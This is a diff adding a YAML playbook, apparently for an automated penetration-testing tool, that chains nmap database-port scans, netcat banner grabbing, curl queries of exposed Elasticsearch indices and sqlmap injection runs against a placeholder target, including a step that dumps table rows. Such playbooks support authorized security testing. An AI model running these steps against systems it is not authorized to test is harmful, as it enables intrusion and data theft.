@@ -1,0 +1,88 @@
+steps:
+  - tool: nmap
+    arguments:
+      target: "{target}"
+      scan_type: "-sS"
+      ports: "1433,1521,27017,27018,3306,5432,6379,7001,9042,9200,9300"
+      additional_args: "-T4 --reason"
+    description: "Database port discovery: MSSQL, Oracle, MongoDB, MySQL, PostgreSQL, Redis, Cassandra, Elasticsearch"
+
+  - tool: nmap
+    arguments:
+      target: "{target}"
+      scan_type: "-sV"
+      ports: "1433,1521,27017,27018,3306,5432,6379,7001,9042,9200,9300"
+      additional_args: "-T4 --script=mysql-info,ms-sql-info,mongodb-info,redis-info"
+    description: "Database-specific version and info enumeration via NSE scripts"
+
+  - tool: netcat
+    arguments:
+      target: "{target}"
+      port: "3306"
+      mode: "banner"
+      additional_args: "-v -w 2"
+    description: "MySQL banner grabbing to identify exact version and patch level"
+
+  - tool: netcat
+    arguments:
+      target: "{target}"
+      port: "5432"
+      mode: "banner"
+      additional_args: "-v -w 2"
+    description: "PostgreSQL banner grabbing for version identification"
+
+  - tool: netcat
+    arguments:
+      target: "{target}"
+      port: "27017"
+      mode: "banner"
+      additional_args: "-v -w 2"
+    description: "MongoDB banner grabbing to check for unauthenticated access"
+
+  - tool: curl
+    arguments:
+      url: "http://{target}:9200/_cluster/health"
+      additional_args: "-s --max-time 10"
+    description: "Elasticsearch cluster health check (often exposed without auth)"
+
+  - tool: curl
+    arguments:
+      url: "http://{target}:9200/_cat/indices"
+      additional_args: "-s --max-time 10"
+    description: "Elasticsearch index enumeration for data exposure assessment"
+
+  - tool: sqlmap
+    arguments:
+      target: "http://{target}/"
+      mode: "crawl"
+      additional_args: "--crawl=3 --batch --random-agent --level=3 --risk=2 --dbms=mysql"
+    description: "MySQL-targeted SQL injection via crawling with increased depth"
+
+  - tool: sqlmap
+    arguments:
+      target: "http://{target}/"
+      mode: "crawl"
+      additional_args: "--crawl=3 --batch --random-agent --level=3 --risk=2 --dbms=postgresql"
+    description: "PostgreSQL-targeted SQL injection via crawling"
+
+  - tool: sqlmap
+    arguments:
+      target: "http://{target}/"
+      mode: "crawl"
+      additional_args: "--crawl=3 --batch --random-agent --level=3 --risk=2 --dbms=mssql"
+    description: "MSSQL-targeted SQL injection via crawling"
+
+  - tool: sqlmap
+    arguments:
+      target: "http://{target}/"
+      mode: "forms"
+      additional_args: "--forms --batch --random-agent --level=3 --risk=2 --dump --stop=10"
+    description: "Form-based SQL injection with limited data dump (first 10 rows)"
+
+  - tool: nmap
+    arguments:
+      target: "{target}"
+      scan_type: "--script mysql-empty-password,mysql-users,mysql-databases,mysql-variables"
+      ports: "3306"
+      additional_args: "-T4"
+    description: "MySQL security audit: empty passwords, user enumeration, database listing"
